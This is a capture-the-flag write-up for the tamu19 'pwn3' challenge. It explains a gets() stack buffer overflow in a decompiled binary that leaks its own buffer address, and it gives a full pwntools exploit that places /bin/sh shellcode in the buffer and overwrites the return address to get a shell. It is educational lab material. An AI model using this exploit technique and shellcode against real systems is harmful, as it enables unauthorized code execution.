**This is a writeup for tamu19 pwn3 challenge**

Let's take a look at the main function:
```
undefined4 main(void)

{
  undefined1 *puVar1;
  
  puVar1 = &stack0x00000004;
  setvbuf(_stdout,(char *)0x2,0,0);
  echo(puVar1);
  return 0;
}
```
In this function we can see not too much is going on. It calls the echo function with puVar1 as an argument. Let's dissect the echo function to see what is going on in there.

```
void echo(void)

{
  char input [294];
  
  printf("Take this, you might need it on your journey %p!\n", input);
  gets(input);
  return;
}
```

In this function we can see that we are given a buffer that has 294 bytes of space allocated. Now our bug in the program is the gets function. That is because the gets function can take any amount of input meaning we can input enough data into the input buffer so that we can overflow it.
Another important thing to note is that in our printf statement, the program prints the address of our input buffer. What can we do with this???
We can overwrite the return address with the address of our input buffer. This will set the EIP to the address of our input buffer which means that once we return, any code in our input buffer will be executed.
This is how we can capture the leaked address from the program:
```
r.recvuntil(b"Take this, you might need it on your journey")
line = r.recvline().strip()
BUFF_ADDR = int(line.rstrip(b"!"), 16)
```

All this does is what until we recieve the line used in the print function and then strip the line from \n and ! values.

Lets take a look at the stack so we can see how much we need to overflow the buffer and what we can rewrite.
```
<RETURN>
Stack[-0x8]:4 local_8
Stack[-0x12e]:1 input
```

We have a local_8 variable but if we look into the code, that is not really used anywhere so that will not be the target of our exploit. What we can do is we can overflow the input buffer into the return address.
After getting to the return address we can overwrite the return address with the address of the input buffer and have it execute shell code so that we can pop a shell onto the machine.

To start off our payload, we need to calculate the offset between our input buffer and the return address. If we convert 0x12e into decimal, we get the value 302.
This means that we need to write that many bytes into the input before we reach the return address.
Since we want to pop a shell, we need to write a working shell code into the input buffer. Our code for this will look like this.
```
shellcode = b"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"
```

Now that we havea working shell code, we can write that into our buffer. Remember that since we need to fill up the entire iunput buffer, our shell code will not be enough so we need to calculate the remaining amount of bytes that remain in our buffer that we need to fill. We can do that by taking the offset and subtracting the length of the shellcode from it.
Our payload segment will look like this:
```
payload = shellcode + b"0" * (OFFSET - len(shellcode))
```

Ok now we have reached the return address and now all we need to do is use the leaked address of our input buffer that the program printed out to the console. We will use that address to overwrite the return address.
Our payload segment will look like this:
```
payload += p32(BUFF_ADDR)
```

**Final Exploit**
```
from pwn import *

BINARY = "./pwn3"
elf = ELF(BINARY)
context.binary = elf
r = process(BINARY)

shellcode = b"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"
OFFSET = 0x12e

r.recvuntil(b"Take this, you might need it on your journey")
line = r.recvline().strip()
BUFF_ADDR = int(line.rstrip(b"!"), 16)
payload = shellcode + b"0" * (OFFSET - len(shellcode)) + p32(BUFF_ADDR)
r.sendline(payload)
r.interactive()
```